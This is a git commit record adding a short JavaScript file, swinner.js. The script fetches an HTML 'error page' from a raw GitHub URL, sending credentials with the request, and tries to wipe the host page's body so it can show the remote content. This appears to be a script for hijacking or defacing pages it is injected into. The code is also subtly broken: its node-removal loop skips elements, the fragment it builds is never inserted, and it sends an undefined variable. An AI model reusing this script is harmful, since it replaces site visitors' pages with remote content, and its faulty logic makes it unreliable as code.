753fbd3e26bdeb2c6bd03f77160629a54d3512ea
asmodeus <133128070+vinert1a@users.noreply.github.com>
2023-05-10 14:45:36 +0000

    first version

---
+++ swinner.js
@@ -0,0 +1,21 @@
+const xhr = new XMLHttpRequest();
+xhr.withCredentials = true;
+
+xhr.addEventListener("readystatechange", function () {
+  if (this.readyState === this.DONE) {
+    var elms = document.body.childNodes.length;
+    var idx = 0;
+    while (elms > idx) {
+      document.body.childNodes[idx].remove();
+      idx++;
+    }
+    document.createRange().createContextualFragment(this.responseText);
+  }
+});
+
+xhr.open(
+  "GET",
+  "https://raw.githubusercontent.com/vinert1a/swinner/main/errorpage.html"
+);
+
+xhr.send(data);
